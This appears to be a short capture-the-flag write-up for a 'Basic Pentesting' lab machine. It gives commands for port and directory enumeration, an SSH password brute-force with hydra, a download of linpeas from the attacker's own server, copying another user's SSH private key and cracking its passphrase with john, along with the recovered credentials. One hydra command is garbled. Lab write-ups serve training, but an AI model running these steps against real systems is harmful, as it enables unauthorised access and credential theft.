#Basic Pentesting Machine

Machine IP: 10.10.35.202

## Enumeration

### nmap scan:
```
sudo nmap -sC -sV -oN nmap/initial $IP
```
Open ports:
22, 80, 139, 445, 8009, 8080

After checking the website, it says it is under construction and haven't found anything interesting.

### gobuster scan:
```
gobuster dir -u http://10.10.35.202 -w /usr/share/wordlistdirbuster/directory-list-1.0.txt
```

We found a hidden directory: /development
Here we found some messages from the users, saying that the passwords are weak and need them changed

### enum4Linux:
```
enum4linux -a 10.10.35.202 | tee enum4linux.log
```
found 2 users: kay and jan

## Exploitation

We know the useranames, and we know that one of their passwrods is weak, so we can try to bruteforce it with hydra:

```
hydra -l jan -P /usr/share/wordlistshydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.35.202
```

Password found: armando

After that, we can login in ssh
We transfer a linPEAS file to jan's user after opening a http server:
```
python3 -m http.server 80
```
```
wget http://10.21.13.118:80/linpeas.sh
```
and then we execute it
we found that we can access kay's id_rsa, so we copy it, use ssh2john, and then john to break the paraphrase of the id-rsa
```
/usr/share/john/ssh2john.py kay-rsa > forjohn.txt
john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

paraphrase: beeswax

content of kay's file: heresareallystrongpasswordthatfollowsthepasswordpolicy$$
